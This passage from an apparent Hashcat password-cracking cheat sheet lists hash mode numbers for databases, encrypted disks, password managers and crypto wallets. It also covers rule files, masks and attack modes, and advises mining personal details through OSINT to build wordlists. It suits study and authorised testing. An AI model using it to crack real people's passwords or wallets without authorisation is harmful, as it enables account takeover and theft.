| 24100 | MongoDB ServerKey SCRAM-SHA-1                                        | Database Server                       |
| 24200 | MongoDB ServerKey SCRAM-SHA-256                                      | Database Server                       |
|   12 | PostgreSQL                                                           | Database Server                       |
| 11100 | PostgreSQL CRAM (MD5)                                                | Database Server                       |
| 28600 | PostgreSQL SCRAM-SHA-256                                             | Database Server                       |
| 3100 | Oracle H: Type (Oracle 7+)                                           | Database Server                       |
|  112 | Oracle S: Type (Oracle 11+)                                          | Database Server                       |
| 12300 | Oracle T: Type (Oracle 12+)                                          | Database Server                       |
| 7401 | MySQL $A$ (sha256crypt)                                              | Database Server                       |
| 11200 | MySQL CRAM (SHA1)                                                    | Database Server                       |
|  200 | MySQL323                                                             | Database Server                       |
|  300 | MySQL4.1/MySQL5                                                      | Database Server                       |
| 8000 | Sybase ASE                                                           | Database Server                       |
| 8300 | DNSSEC (NSEC3)                                                       | FTP, HTTP, SMTP, LDAP Server          |
| 25900 | KNX IP Secure - Device Authentication Code                           | FTP, HTTP, SMTP, LDAP Server          |
| 16400 | CRAM-MD5 Dovecot                                                     | FTP, HTTP, SMTP, LDAP Server          |
| 1411 | SSHA-256(Base64), LDAP {SSHA256}                                     | FTP, HTTP, SMTP, LDAP Server          |
| 1711 | SSHA-512(Base64), LDAP {SSHA512}                                     | FTP, HTTP, SMTP, LDAP Server          |
| 24900 | Dahua Authentication MD5                                             | FTP, HTTP, SMTP, LDAP Server          |
| 10901 | RedHat 389-DS LDAP (PBKDF2-HMAC-SHA256)                              | FTP, HTTP, SMTP, LDAP Server          |
| 15000 | FileZilla Server >= 0.9.55                                           | FTP, HTTP, SMTP, LDAP Server          |
| 12600 | ColdFusion 10+                                                       | FTP, HTTP, SMTP, LDAP Server          |
| 1600 | Apache $apr1$ MD5, md5apr1, MD5 (APR)                                | FTP, HTTP, SMTP, LDAP Server          |
|  141 | Episerver 6.x < .NET 4                                               | FTP, HTTP, SMTP, LDAP Server          |
| 1441 | Episerver 6.x >= .NET 4                                              | FTP, HTTP, SMTP, LDAP Server          |
| 1421 | hMailServer                                                          | FTP, HTTP, SMTP, LDAP Server          |
|  101 | nsldap, SHA-1(Base64), Netscape LDAP SHA                             | FTP, HTTP, SMTP, LDAP Server          |
|  111 | nsldaps, SSHA-1(Base64), Netscape LDAP SSHA                          | FTP, HTTP, SMTP, LDAP Server          |
| 7700 | SAP CODVN B (BCODE)                                                  | Enterprise Application Software (EAS)  |
| 7701 | SAP CODVN B (BCODE) from RFC_READ_TABLE                              | Enterprise Application Software (EAS)  |
| 7800 | SAP CODVN F/G (PASSCODE)                                             | Enterprise Application Software (EAS)  |
| 7801 | SAP CODVN F/G (PASSCODE) from RFC_READ_TABLE                         | Enterprise Application Software (EAS)  |
| 10300 | SAP CODVN H (PWDSALTEDHASH) iSSHA-1                                  | Enterprise Application Software (EAS)  |
|  133 | PeopleSoft                                                           | Enterprise Application Software (EAS)  |
| 13500 | PeopleSoft PS_TOKEN                                                  | Enterprise Application Software (EAS)  |
| 21500 | SolarWinds Orion                                                     | Enterprise Application Software (EAS)  |
| 21501 | SolarWinds Orion v2                                                  | Enterprise Application Software (EAS)  |
|   24 | SolarWinds Serv-U                                                    | Enterprise Application Software (EAS)  |
| 8600 | Lotus Notes/Domino 5                                                 | Enterprise Application Software (EAS)  |
| 8700 | Lotus Notes/Domino 6                                                 | Enterprise Application Software (EAS)  |
| 9100 | Lotus Notes/Domino 8                                                 | Enterprise Application Software (EAS)  |
| 26200 | OpenEdge Progress Encode                                             | Enterprise Application Software (EAS)  |
| 20600 | Oracle Transportation Management (SHA256)                            | Enterprise Application Software (EAS)  |
| 4711 | Huawei sha1(md5($pass).$salt)                                        | Enterprise Application Software (EAS)  |
| 20711 | AuthMe sha256                                                        | Enterprise Application Software (EAS)  |
| 22400 | AES Crypt (SHA256)                                                   | Full-Disk Encryption (FDE)            |
| 27400 | VMware VMX (PBKDF2-HMAC-SHA1 + AES-256-CBC)                          | Full-Disk Encryption (FDE)            |
| 14600 | LUKS v1 (legacy)                                                     | Full-Disk Encryption (FDE)            |
| 29541 | LUKS v1 RIPEMD-160 + AES                                             | Full-Disk Encryption (FDE)            |
| 29542 | LUKS v1 RIPEMD-160 + Serpent                                         | Full-Disk Encryption (FDE)            |
| 29543 | LUKS v1 RIPEMD-160 + Twofish                                         | Full-Disk Encryption (FDE)            |
| 29511 | LUKS v1 SHA-1 + AES                                                  | Full-Disk Encryption (FDE)            |
| 29512 | LUKS v1 SHA-1 + Serpent                                              | Full-Disk Encryption (FDE)            |
| 29513 | LUKS v1 SHA-1 + Twofish                                              | Full-Disk Encryption (FDE)            |
| 29521 | LUKS v1 SHA-256 + AES                                                | Full-Disk Encryption (FDE)            |
| 29522 | LUKS v1 SHA-256 + Serpent                                            | Full-Disk Encryption (FDE)            |
| 29523 | LUKS v1 SHA-256 + Twofish                                            | Full-Disk Encryption (FDE)            |
| 29531 | LUKS v1 SHA-512 + AES                                                | Full-Disk Encryption (FDE)            |
| 29532 | LUKS v1 SHA-512 + Serpent                                            | Full-Disk Encryption (FDE)            |
| 29533 | LUKS v1 SHA-512 + Twofish                                            | Full-Disk Encryption (FDE)            |
| 13711 | VeraCrypt RIPEMD160 + XTS 512 bit (legacy)                           | Full-Disk Encryption (FDE)            |
| 13712 | VeraCrypt RIPEMD160 + XTS 1024 bit (legacy)                          | Full-Disk Encryption (FDE)            |
| 13713 | VeraCrypt RIPEMD160 + XTS 1536 bit (legacy)                          | Full-Disk Encryption (FDE)            |
| 13741 | VeraCrypt RIPEMD160 + XTS 512 bit + boot-mode (legacy)               | Full-Disk Encryption (FDE)            |
| 13742 | VeraCrypt RIPEMD160 + XTS 1024 bit + boot-mode (legacy)              | Full-Disk Encryption (FDE)            |
| 13743 | VeraCrypt RIPEMD160 + XTS 1536 bit + boot-mode (legacy)              | Full-Disk Encryption (FDE)            |
| 29411 | VeraCrypt RIPEMD160 + XTS 512 bit                                    | Full-Disk Encryption (FDE)            |
| 29412 | VeraCrypt RIPEMD160 + XTS 1024 bit                                   | Full-Disk Encryption (FDE)            |
| 29413 | VeraCrypt RIPEMD160 + XTS 1536 bit                                   | Full-Disk Encryption (FDE)            |
| 29441 | VeraCrypt RIPEMD160 + XTS 512 bit + boot-mode                        | Full-Disk Encryption (FDE)            |
| 29442 | VeraCrypt RIPEMD160 + XTS 1024 bit + boot-mode                       | Full-Disk Encryption (FDE)            |
| 29443 | VeraCrypt RIPEMD160 + XTS 1536 bit + boot-mode                       | Full-Disk Encryption (FDE)            |
| 13751 | VeraCrypt SHA256 + XTS 512 bit (legacy)                              | Full-Disk Encryption (FDE)            |
| 13752 | VeraCrypt SHA256 + XTS 1024 bit (legacy)                             | Full-Disk Encryption (FDE)            |
| 13753 | VeraCrypt SHA256 + XTS 1536 bit (legacy)                             | Full-Disk Encryption (FDE)            |
| 13761 | VeraCrypt SHA256 + XTS 512 bit + boot-mode (legacy)                  | Full-Disk Encryption (FDE)            |
| 13762 | VeraCrypt SHA256 + XTS 1024 bit + boot-mode (legacy)                 | Full-Disk Encryption (FDE)            |
| 13763 | VeraCrypt SHA256 + XTS 1536 bit + boot-mode (legacy)                 | Full-Disk Encryption (FDE)            |
| 29451 | VeraCrypt SHA256 + XTS 512 bit                                       | Full-Disk Encryption (FDE)            |
| 29452 | VeraCrypt SHA256 + XTS 1024 bit                                      | Full-Disk Encryption (FDE)            |
| 29453 | VeraCrypt SHA256 + XTS 1536 bit                                      | Full-Disk Encryption (FDE)            |
| 29461 | VeraCrypt SHA256 + XTS 512 bit + boot-mode                           | Full-Disk Encryption (FDE)            |
| 29462 | VeraCrypt SHA256 + XTS 1024 bit + boot-mode                          | Full-Disk Encryption (FDE)            |
| 29463 | VeraCrypt SHA256 + XTS 1536 bit + boot-mode                          | Full-Disk Encryption (FDE)            |
| 13721 | VeraCrypt SHA512 + XTS 512 bit (legacy)                              | Full-Disk Encryption (FDE)            |
| 13722 | VeraCrypt SHA512 + XTS 1024 bit (legacy)                             | Full-Disk Encryption (FDE)            |
| 13723 | VeraCrypt SHA512 + XTS 1536 bit (legacy)                             | Full-Disk Encryption (FDE)            |
| 29421 | VeraCrypt SHA512 + XTS 512 bit                                       | Full-Disk Encryption (FDE)            |
| 29422 | VeraCrypt SHA512 + XTS 1024 bit                                      | Full-Disk Encryption (FDE)            |
| 29423 | VeraCrypt SHA512 + XTS 1536 bit                                      | Full-Disk Encryption (FDE)            |
| 13771 | VeraCrypt Streebog-512 + XTS 512 bit (legacy)                        | Full-Disk Encryption (FDE)            |
| 13772 | VeraCrypt Streebog-512 + XTS 1024 bit (legacy)                       | Full-Disk Encryption (FDE)            |
| 13773 | VeraCrypt Streebog-512 + XTS 1536 bit (legacy)                       | Full-Disk Encryption (FDE)            |
| 13781 | VeraCrypt Streebog-512 + XTS 512 bit + boot-mode (legacy)            | Full-Disk Encryption (FDE)            |
| 13782 | VeraCrypt Streebog-512 + XTS 1024 bit + boot-mode (legacy)           | Full-Disk Encryption (FDE)            |
| 13783 | VeraCrypt Streebog-512 + XTS 1536 bit + boot-mode (legacy)           | Full-Disk Encryption (FDE)            |
| 29471 | VeraCrypt Streebog-512 + XTS 512 bit                                 | Full-Disk Encryption (FDE)            |
| 29472 | VeraCrypt Streebog-512 + XTS 1024 bit                                | Full-Disk Encryption (FDE)            |
| 29473 | VeraCrypt Streebog-512 + XTS 1536 bit                                | Full-Disk Encryption (FDE)            |
| 29481 | VeraCrypt Streebog-512 + XTS 512 bit + boot-mode                     | Full-Disk Encryption (FDE)            |
| 29482 | VeraCrypt Streebog-512 + XTS 1024 bit + boot-mode                    | Full-Disk Encryption (FDE)            |
| 29483 | VeraCrypt Streebog-512 + XTS 1536 bit + boot-mode                    | Full-Disk Encryption (FDE)            |
| 13731 | VeraCrypt Whirlpool + XTS 512 bit (legacy)                           | Full-Disk Encryption (FDE)            |
| 13732 | VeraCrypt Whirlpool + XTS 1024 bit (legacy)                          | Full-Disk Encryption (FDE)            |
| 13733 | VeraCrypt Whirlpool + XTS 1536 bit (legacy)                          | Full-Disk Encryption (FDE)            |
| 29431 | VeraCrypt Whirlpool + XTS 512 bit                                    | Full-Disk Encryption (FDE)            |
| 29432 | VeraCrypt Whirlpool + XTS 1024 bit                                   | Full-Disk Encryption (FDE)            |
| 29433 | VeraCrypt Whirlpool + XTS 1536 bit                                   | Full-Disk Encryption (FDE)            |
| 23900 | BestCrypt v3 Volume Encryption                                       | Full-Disk Encryption (FDE)            |
| 16700 | FileVault 2                                                          | Full-Disk Encryption (FDE)            |
| 27500 | VirtualBox (PBKDF2-HMAC-SHA256 & AES-128-XTS)                        | Full-Disk Encryption (FDE)            |
| 27600 | VirtualBox (PBKDF2-HMAC-SHA256 & AES-256-XTS)                        | Full-Disk Encryption (FDE)            |
| 20011 | DiskCryptor SHA512 + XTS 512 bit                                     | Full-Disk Encryption (FDE)            |
| 20012 | DiskCryptor SHA512 + XTS 1024 bit                                    | Full-Disk Encryption (FDE)            |
| 20013 | DiskCryptor SHA512 + XTS 1536 bit                                    | Full-Disk Encryption (FDE)            |
| 22100 | BitLocker                                                            | Full-Disk Encryption (FDE)            |
| 12900 | Android FDE (Samsung DEK)                                            | Full-Disk Encryption (FDE)            |
| 8800 | Android FDE <= 4.3                                                   | Full-Disk Encryption (FDE)            |
| 18300 | Apple File System (APFS)                                             | Full-Disk Encryption (FDE)            |
| 6211 | TrueCrypt RIPEMD160 + XTS 512 bit (legacy)                           | Full-Disk Encryption (FDE)            |
| 6212 | TrueCrypt RIPEMD160 + XTS 1024 bit (legacy)                          | Full-Disk Encryption (FDE)            |
| 6213 | TrueCrypt RIPEMD160 + XTS 1536 bit (legacy)                          | Full-Disk Encryption (FDE)            |
| 6241 | TrueCrypt RIPEMD160 + XTS 512 bit + boot-mode (legacy)               | Full-Disk Encryption (FDE)            |
| 6242 | TrueCrypt RIPEMD160 + XTS 1024 bit + boot-mode (legacy)              | Full-Disk Encryption (FDE)            |
| 6243 | TrueCrypt RIPEMD160 + XTS 1536 bit + boot-mode (legacy)              | Full-Disk Encryption (FDE)            |
| 29311 | TrueCrypt RIPEMD160 + XTS 512 bit                                    | Full-Disk Encryption (FDE)            |
| 29312 | TrueCrypt RIPEMD160 + XTS 1024 bit                                   | Full-Disk Encryption (FDE)            |
| 29313 | TrueCrypt RIPEMD160 + XTS 1536 bit                                   | Full-Disk Encryption (FDE)            |
| 29341 | TrueCrypt RIPEMD160 + XTS 512 bit + boot-mode                        | Full-Disk Encryption (FDE)            |
| 29342 | TrueCrypt RIPEMD160 + XTS 1024 bit + boot-mode                       | Full-Disk Encryption (FDE)            |
| 29343 | TrueCrypt RIPEMD160 + XTS 1536 bit + boot-mode                       | Full-Disk Encryption (FDE)            |
| 6221 | TrueCrypt SHA512 + XTS 512 bit (legacy)                              | Full-Disk Encryption (FDE)            |
| 6222 | TrueCrypt SHA512 + XTS 1024 bit (legacy)                             | Full-Disk Encryption (FDE)            |
| 6223 | TrueCrypt SHA512 + XTS 1536 bit (legacy)                             | Full-Disk Encryption (FDE)            |
| 29321 | TrueCrypt SHA512 + XTS 512 bit                                       | Full-Disk Encryption (FDE)            |
| 29322 | TrueCrypt SHA512 + XTS 1024 bit                                      | Full-Disk Encryption (FDE)            |
| 29323 | TrueCrypt SHA512 + XTS 1536 bit                                      | Full-Disk Encryption (FDE)            |
| 6231 | TrueCrypt Whirlpool + XTS 512 bit (legacy)                           | Full-Disk Encryption (FDE)            |
| 6232 | TrueCrypt Whirlpool + XTS 1024 bit (legacy)                          | Full-Disk Encryption (FDE)            |
| 6233 | TrueCrypt Whirlpool + XTS 1536 bit (legacy)                          | Full-Disk Encryption (FDE)            |
| 29331 | TrueCrypt Whirlpool + XTS 512 bit                                    | Full-Disk Encryption (FDE)            |
| 29332 | TrueCrypt Whirlpool + XTS 1024 bit                                   | Full-Disk Encryption (FDE)            |
| 29333 | TrueCrypt Whirlpool + XTS 1536 bit                                   | Full-Disk Encryption (FDE)            |
| 12200 | eCryptfs                                                             | Full-Disk Encryption (FDE)            |
| 10400 | PDF 1.1 - 1.3 (Acrobat 2 - 4)                                        | Document                              |
| 10410 | PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #1                           | Document                              |
| 10420 | PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #2                           | Document                              |
| 10500 | PDF 1.4 - 1.6 (Acrobat 5 - 8)                                        | Document                              |
| 25400 | PDF 1.4 - 1.6 (Acrobat 5 - 8) - user and owner pass                  | Document                              |
| 10600 | PDF 1.7 Level 3 (Acrobat 9)                                          | Document                              |
| 10700 | PDF 1.7 Level 8 (Acrobat 10 - 11)                                    | Document                              |
| 9400 | MS Office 2007                                                       | Document                              |
| 9500 | MS Office 2010                                                       | Document                              |
| 9600 | MS Office 2013                                                       | Document                              |
| 25300 | MS Office 2016 - SheetProtection                                     | Document                              |
| 9700 | MS Office <= 2003 $0/$1, MD5 + RC4                                   | Document                              |
| 9710 | MS Office <= 2003 $0/$1, MD5 + RC4, collider #1                      | Document                              |
| 9720 | MS Office <= 2003 $0/$1, MD5 + RC4, collider #2                      | Document                              |
| 9810 | MS Office <= 2003 $3, SHA1 + RC4, collider #1                        | Document                              |
| 9820 | MS Office <= 2003 $3, SHA1 + RC4, collider #2                        | Document                              |
| 9800 | MS Office <= 2003 $3/$4, SHA1 + RC4                                  | Document                              |
| 18400 | Open Document Format (ODF) 1.2 (SHA-256, AES)                        | Document                              |
| 18600 | Open Document Format (ODF) 1.1 (SHA-1, Blowfish)                     | Document                              |
| 16200 | Apple Secure Notes                                                   | Document                              |
| 23300 | Apple iWork                                                          | Document                              |
| 6600 | 1Password, agilekeychain                                             | Password Manager                      |
| 8200 | 1Password, cloudkeychain                                             | Password Manager                      |
| 9000 | Password Safe v2                                                     | Password Manager                      |
| 5200 | Password Safe v3                                                     | Password Manager                      |
| 6800 | LastPass + LastPass sniffed                                          | Password Manager                      |
| 13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES)                          | Password Manager                      |
| 29700 | KeePass 1 (AES/Twofish) and KeePass 2 (AES) - keyfile only mode      | Password Manager                      |
| 23400 | Bitwarden                                                            | Password Manager                      |
| 16900 | Ansible Vault                                                        | Password Manager                      |
| 26000 | Mozilla key3.db                                                      | Password Manager                      |
| 26100 | Mozilla key4.db                                                      | Password Manager                      |
| 23100 | Apple Keychain                                                       | Password Manager                      |
| 11600 | 7-Zip                                                                | Archive                               |
| 12500 | RAR3-hp                                                              | Archive                               |
| 23800 | RAR3-p (Compressed)                                                  | Archive                               |
| 23700 | RAR3-p (Uncompressed)                                                | Archive                               |
| 13000 | RAR5                                                                 | Archive                               |
| 17220 | PKZIP (Compressed Multi-File)                                        | Archive                               |
| 17200 | PKZIP (Compressed)                                                   | Archive                               |
| 17225 | PKZIP (Mixed Multi-File)                                             | Archive                               |
| 17230 | PKZIP (Mixed Multi-File Checksum-Only)                               | Archive                               |
| 17210 | PKZIP (Uncompressed)                                                 | Archive                               |
| 20500 | PKZIP Master Key                                                     | Archive                               |
| 20510 | PKZIP Master Key (6 byte optimization)                               | Archive                               |
| 23001 | SecureZIP AES-128                                                    | Archive                               |
| 23002 | SecureZIP AES-192                                                    | Archive                               |
| 23003 | SecureZIP AES-256                                                    | Archive                               |
| 13600 | WinZip                                                               | Archive                               |
| 18900 | Android Backup                                                       | Archive                               |
| 24700 | Stuffit5                                                             | Archive                               |
| 13200 | AxCrypt 1                                                            | Archive                               |
| 13300 | AxCrypt 1 in-memory SHA1                                             | Archive                               |
| 23500 | AxCrypt 2 AES-128                                                    | Archive                               |
| 23600 | AxCrypt 2 AES-256                                                    | Archive                               |
| 14700 | iTunes backup < 10.0                                                 | Archive                               |
| 14800 | iTunes backup >= 10.0                                                | Archive                               |
| 8400 | WBB3 (Woltlab Burning Board)                                         | Forums, CMS, E-Commerce               |
| 2612 | PHPS                                                                 | Forums, CMS, E-Commerce               |
| 121 | SMF (Simple Machines Forum) > v1.1                                   | Forums, CMS, E-Commerce               |
| 3711 | MediaWiki B type                                                     | Forums, CMS, E-Commerce               |
| 4521 | Redmine                                                              | Forums, CMS, E-Commerce               |
| 24800 | Umbraco HMAC-SHA1                                                    | Forums, CMS, E-Commerce               |
| 11 | Joomla < 2.5.18                                                      | Forums, CMS, E-Commerce               |
| 13900 | OpenCart                                                             | Forums, CMS, E-Commerce               |
| 11000 | PrestaShop                                                           | Forums, CMS, E-Commerce               |
| 16000 | Tripcode                                                             | Forums, CMS, E-Commerce               |
| 7900 | Drupal7                                                              | Forums, CMS, E-Commerce               |
| 4522 | PunBB                                                                | Forums, CMS, E-Commerce               |
| 2811 | MyBB 1.2+, IPB2+ (Invision Power Board)                              | Forums, CMS, E-Commerce               |
| 2611 | vBulletin < v3.8.5                                                   | Forums, CMS, E-Commerce               |
| 2711 | vBulletin >= v3.8.5                                                  | Forums, CMS, E-Commerce               |
| 25600 | bcrypt(md5($pass)) / bcryptmd5                                       | Forums, CMS, E-Commerce               |
| 25800 | bcrypt(sha1($pass)) / bcryptsha1                                     | Forums, CMS, E-Commerce               |
| 28400 | bcrypt(sha512($pass)) / bcryptsha512                                 | Forums, CMS, E-Commerce               |
| 21 | osCommerce, xt:Commerce                                              | Forums, CMS, E-Commerce               |
| 18100 | TOTP (HMAC-SHA1)                                                     | One-Time Password                     |
| 2000 | STDOUT                                                               | Plaintext                             |
| 99999 | Plaintext                                                            | Plaintext                             |
| 21600 | Web2py pbkdf2-sha512                                                 | Framework                             |
| 10000 | Django (PBKDF2-SHA256)                                               | Framework                             |
| 124 | Django (SHA-1)                                                       | Framework                             |
| 12001 | Atlassian (PBKDF2-HMAC-SHA1)                                         | Framework                             |
| 19500 | Ruby on Rails Restful-Authentication                                 | Framework                             |
| 27200 | Ruby on Rails Restful Auth (one round, no sitekey)                   | Framework                             |
| 30000 | Python Werkzeug MD5 (HMAC-MD5 (key = $salt))                         | Framework                             |
| 30120 | Python Werkzeug SHA256 (HMAC-SHA256 (key = $salt))                   | Framework                             |
| 20200 | Python passlib pbkdf2-sha512                                         | Framework                             |
| 20300 | Python passlib pbkdf2-sha256                                         | Framework                             |
| 20400 | Python passlib pbkdf2-sha1                                           | Framework                             |
| 24410 | PKCS#8 Private Keys (PBKDF2-HMAC-SHA1 + 3DES/AES)                    | Private Key                           |
| 24420 | PKCS#8 Private Keys (PBKDF2-HMAC-SHA256 + 3DES/AES)                  | Private Key                           |
| 15500 | JKS Java Key Store Private Keys (SHA1)                               | Private Key                           |
| 22911 | RSA/DSA/EC/OpenSSH Private Keys ($0$)                                | Private Key                           |
| 22921 | RSA/DSA/EC/OpenSSH Private Keys ($6$)                                | Private Key                           |
| 22931 | RSA/DSA/EC/OpenSSH Private Keys ($1, $3$)                            | Private Key                           |
| 22941 | RSA/DSA/EC/OpenSSH Private Keys ($4$)                                | Private Key                           |
| 22951 | RSA/DSA/EC/OpenSSH Private Keys ($5$)                                | Private Key                           |
| 23200 | XMPP SCRAM PBKDF2-SHA1                                               | Instant Messaging Service             |
| 28300 | Teamspeak 3 (channel hash)                                           | Instant Messaging Service             |
| 22600 | Telegram Desktop < v2.1.14 (PBKDF2-HMAC-SHA1)                        | Instant Messaging Service             |
| 24500 | Telegram Desktop >= v2.1.14 (PBKDF2-HMAC-SHA512)                     | Instant Messaging Service             |
| 22301 | Telegram Mobile App Passcode (SHA256)                                | Instant Messaging Service             |
| 23 | Skype                                                                | Instant Messaging Service             |
| 29600 | Terra Station Wallet (AES256-CBC(PBKDF2($pass)))                     | Cryptocurrency Wallet                 |
| 26600 | MetaMask Wallet                                                      | Cryptocurrency Wallet                 |
| 21000 | BitShares v0.x - sha512(sha512_bin(pass))                            | Cryptocurrency Wallet                 |
| 28501 | Bitcoin WIF private key (P2PKH), compressed                          | Cryptocurrency Wallet                 |
| 28502 | Bitcoin WIF private key (P2PKH), uncompressed                        | Cryptocurrency Wallet                 |
| 28503 | Bitcoin WIF private key (P2WPKH, Bech32), compressed                 | Cryptocurrency Wallet                 |
| 28504 | Bitcoin WIF private key (P2WPKH, Bech32), uncompressed               | Cryptocurrency Wallet                 |
| 28505 | Bitcoin WIF private key (P2SH(P2WPKH)), compressed                   | Cryptocurrency Wallet                 |
| 28506 | Bitcoin WIF private key (P2SH(P2WPKH)), uncompressed                 | Cryptocurrency Wallet                 |
| 11300 | Bitcoin/Litecoin wallet.dat                                          | Cryptocurrency Wallet                 |
| 16600 | Electrum Wallet (Salt-Type 1-3)                                      | Cryptocurrency Wallet                 |
| 21700 | Electrum Wallet (Salt-Type 4)                                        | Cryptocurrency Wallet                 |
| 21800 | Electrum Wallet (Salt-Type 5)                                        | Cryptocurrency Wallet                 |
| 12700 | Blockchain, My Wallet                                                | Cryptocurrency Wallet                 |
| 15200 | Blockchain, My Wallet, V2                                            | Cryptocurrency Wallet                 |
| 18800 | Blockchain, My Wallet, Second Password (SHA256)                      | Cryptocurrency Wallet                 |
| 25500 | Stargazer Stellar Wallet XLM                                         | Cryptocurrency Wallet                 |
| 16300 | Ethereum Pre-Sale Wallet, PBKDF2-HMAC-SHA256                         | Cryptocurrency Wallet                 |
| 15600 | Ethereum Wallet, PBKDF2-HMAC-SHA256                                  | Cryptocurrency Wallet                 |
| 15700 | Ethereum Wallet, SCRYPT                                              | Cryptocurrency Wallet                 |
| 22500 | MultiBit Classic .key (MD5)                                          | Cryptocurrency Wallet                 |
| 27700 | MultiBit Classic .wallet (scrypt)                                    | Cryptocurrency Wallet                 |
| 22700 | MultiBit HD (scrypt)                                                 | Cryptocurrency Wallet                 |
| 28200 | Exodus Desktop Wallet (scrypt)                                       | Cryptocurrency Wallet                 |

</details>

<details>
<summary><h3>Hashcat Rules</h3></summary>

| Rule File                          | Description                                                                 |
|------------------------------------|-----------------------------------------------------------------------------|
| `best64.rule`                     | Contains 64 of the most effective password mutation rules                   |
| `combinator.rule`                 | Combines words from two dictionaries (pairwise combinations)                |
| `d3ad0ne.rule`                    | Extensive rule set with complex transformations (origin unknown)            |
| `dive.rule`                       | Very large rule set with deep mutation patterns                             |
| `generated.rule`                  | Automatically generated rule set (basic version)                            |
| `generated2.rule`                 | Expanded version of generated.rule with more variations                     |
| `Incisive-leetspeak.rule`         | Advanced leet speak substitutions (e.g., a->4, e->3, etc.)                  |
| `InsidePro-HashManager.rule`      | Rule set from InsidePro's HashManager tool                                  |
| `InsidePro-PasswordsPro.rule`     | Rule set from InsidePro's PasswordsPro tool                                 |
| `leetspeak.rule`                  | Basic leet speak character substitutions                                    |
| `oscommerce.rule`                 | Specific rules targeting osCommerce password patterns                       |
| `rockyou-30000.rule`              | Rule set derived from patterns in the rockyou.txt password list             |
| `specific.rule`                   | Targeted rules for specific password mutation scenarios                     |
| `T0XlC*` rules                    | Comprehensive rule sets with various insertion patterns (numbers, specials) |
| `toggles1.rule`                   | Simple case toggle rules (minimal changes)                                  |
| `toggles2-5.rule`                 | Progressively more complex case toggle combinations                         |
| `unix-ninja-leetspeak.rule`       | Advanced leet speak rules from Unix-Ninja                                   |

*Note: Hybrid rules are in the `/hybrid` subdirectory and combine multiple rule types*

</details>

<details>
<summary><h3>Hashcat Masks</h3></summary>

| Symbol | Charset Description                     | Example Characters                     |
|--------|-----------------------------------------|----------------------------------------|
| `?l`   | Lowercase ASCII letters                 | abcdefghijklmnopqrstuvwxyz            |
| `?u`   | Uppercase ASCII letters                 | ABCDEFGHIJKLMNOPQRSTUVWXYZ            |
| `?d`   | Digits                                  | 0123456789                            |
| `?h`   | Lowercase hexadecimal digits            | 0123456789abcdef                      |
| `?H`   | Uppercase hexadecimal digits            | 0123456789ABCDEF                      |
| `?s`   | Special characters                      | !"#$%&'()*+,-./:;<=>?@[]^_\`{|}~   |
| `?a`   | All printable ASCII (lower+upper+digits+special) | Equivalent to `?l?u?d?s`       |
| `?b`   | All possible byte values (0x00-0xff)    | Non-printable characters included      |

</details>

<details>
<summary><h3>Hashcat Attack Modes</h3></summary>

| Mode | Attack Name          | Description                                                                 |
|------|----------------------|-----------------------------------------------------------------------------|
| 0    | Straight/Dictionary  | Uses words from a dictionary file without modification                      |
| 1    | Combination          | Combines words from multiple dictionaries (pairwise concatenation)          |
| 3    | Brute-Force/Mask     | Generates passwords based on character sets and position patterns           |
| 4    | Rule-Based           | Applies transformation rules to dictionary words (deprecated in v7+)        |
| 5    | Markov-Chain         | Uses statistical models to generate password candidates (deprecated)        |
| 6    | Hybrid Dict+Mask     | Appends mask patterns to each word from a dictionary                        |
| 7    | Hybrid Mask+Dict     | Prepends mask patterns to each word from a dictionary                       |
| 8    | Prince               | PRobability INfinite Chained Elements attack (advanced combinatorics)       |
| 9    | Association          | Uses contextual information (like usernames) to generate attack rules       |

1. **Most Common Attacks**: Modes 0 (dictionary) and 3 (mask) are most frequently used
2. **Hybrid Attacks**: Modes 6 and 7 combine dictionary and mask approaches
3. **Deprecated Modes**: Modes 4 and 5 were replaced by more efficient implementations
4. **Prince Attack**: Mode 8 generates probabilistic chains of dictionary fragments

</details>

</details>

<details>
<summary><h2>Writing Custom Wordlists and Rules</h2></summary>

Many users create their passwords based on simplicity rather than security.

Most people tend to follow predictable patterns when creating passwords. They often:

- Use words related to the service or platform (e.g., including the company's name for work-related accounts).
- Incorporate personal interests or elements from daily life.
- Choose passwords no longer than ten characters (according to statistics provided by [WP Engine](https://wpengine.com/resources/passwords-unmasked-infographic/)).

Common sources of inspiration include:

- **Pets** – names like "fluffy123" or "rex_the_dog"
- **Friends or Family** – nicknames or birth years
- **Sports** – favorite teams, player numbers, or sports terminology
- **Hobbies** – gaming aliases, instruments, or favorite books
- **Pop culture** – movie titles, characters, or song lyrics

Even basic OSINT (Open Source Intelligence) techniques can uncover this kind of personal information, which can be leveraged to guess or crack passwords effectively.

Commonly, users use the following additions for their password to fit the most common password policies:

| **Description**                         | **Password Syntax**     |
|----------------------------------------|--------------------------|
| First letter is uppercase              | `Password`               |
| Adding numbers                         | `Password123`            |
| Adding year                            | `Password2022`           |
| Adding month                           | `Password02`             |
| Last character is an exclamation mark  | `Password2022!`          |
| Adding special characters              | `P@ssw0rd2022!`          |

<details>
<summary><h3>Generating Wordlists using Hashcat</h3></summary>

We can use Hashcat to combine lists of potential names and labels with specific mutation rules to create custom wordlists. Hashcat uses a specific syntax to define characters, words, and their transformations.

| **Name**             | **Function** | **Description**                                          | **Example Rule** | **Input Word** | **Output Word**        |
|----------------------|--------------|----------------------------------------------------------|------------------|----------------|-------------------------|
| Nothing              | :            | Do nothing (passthrough)                                | :                | p@ssW0rd       | p@ssW0rd               |
| Lowercase            | l            | Lowercase all letters                                   | l                | p@ssW0rd       | p@ssw0rd               |
| Uppercase            | u            | Uppercase all letters                                   | u                | p@ssW0rd       | P@SSW0RD               |
| Capitalize           | c            | Capitalize first character, lowercase the rest          | c                | p@ssW0rd       | P@ssw0rd               |
| Invert Capitalize    | C            | Lowercase first character, uppercase the rest           | C                | p@ssW0rd       | p@SSW0RD               |
| Toggle Case          | t            | Toggle the case of all characters                       | t                | p@ssW0rd       | P@SSw0RD               |
| Toggle @ N           | TN           | Toggle case at position N                               | T3               | p@ssW0rd       | p@sSW0rd               |
| Reverse              | r            | Reverse the entire word                                 | r                | p@ssW0rd       | dr0Wss@p               |
| Duplicate            | d            | Duplicate entire word                                   | d                | p@ssW0rd       | p@ssW0rdp@ssW0rd       |
| Duplicate N          | pN           | Append duplicated word N times                          | p2               | p@ssW0rd       | p@ssW0rdp@ssW0rdp@ssW0rd |
| Reflect              | f            | Duplicate word reversed                                 | f                | p@ssW0rd       | p@ssW0rddr0Wss@p       |
| Rotate Left          | {            | Rotate the word left                                    | {                | p@ssW0rd       | @ssW0rdp               |
